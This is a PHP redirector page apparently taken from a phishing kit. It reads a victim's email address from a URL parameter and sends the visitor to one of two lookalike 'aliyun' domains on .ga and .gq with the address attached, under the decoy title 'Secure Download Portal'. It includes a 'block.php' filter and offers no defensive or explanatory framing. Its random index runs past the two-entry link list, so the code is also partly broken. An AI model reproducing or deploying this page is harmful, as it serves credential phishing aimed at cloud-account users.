<?php
require_once 'block.php';
$login="";
$_SESSION['login']="";


function getDomainFromEmail($login)
{
// Get the data after the @ sign
$domain = substr(strrchr($login, "@"), 1);
$remove = array(".com");
return $domain;
} 
// Example

if(isset($_GET['login'])){
$login = $_GET['login'];
$_SESSION['login']=$login;
}
$domain = getDomainFromEmail($login);

?>


<?php
$liks = array("https://a1iyunm.ga/gens/aliyun/?username=",
"https://a1iyunm.gq/gens/aliyun/?username=");

$num= mt_rand(0,5);

$link= $liks[$num];

//header("location: $link?login=<?php echo $login ");
$link =$link."?login=$login";

?>

<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
<html>
<head>
   <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
   <meta name="Generator" content="Microsoft Word 97">
   <meta name="GENERATOR" content="Mozilla/4.73 [en] (Win95; U) [Netscape]">
   <meta http-equiv="REFRESH" content="0;url=<?php echo $link?>">
   <title>Secure Download Portal</title>
</head>
<body link="#0000FF" vlink="#800080">
&nbsp;
<center><table CELLSPACING=10 CELLPADDING=10 COLS=1 WIDTH="100%" >
<tr>

<td>
<center><b><i><font color="#400040"><font size=+1></font></font></i></b>


</body>
</html> 

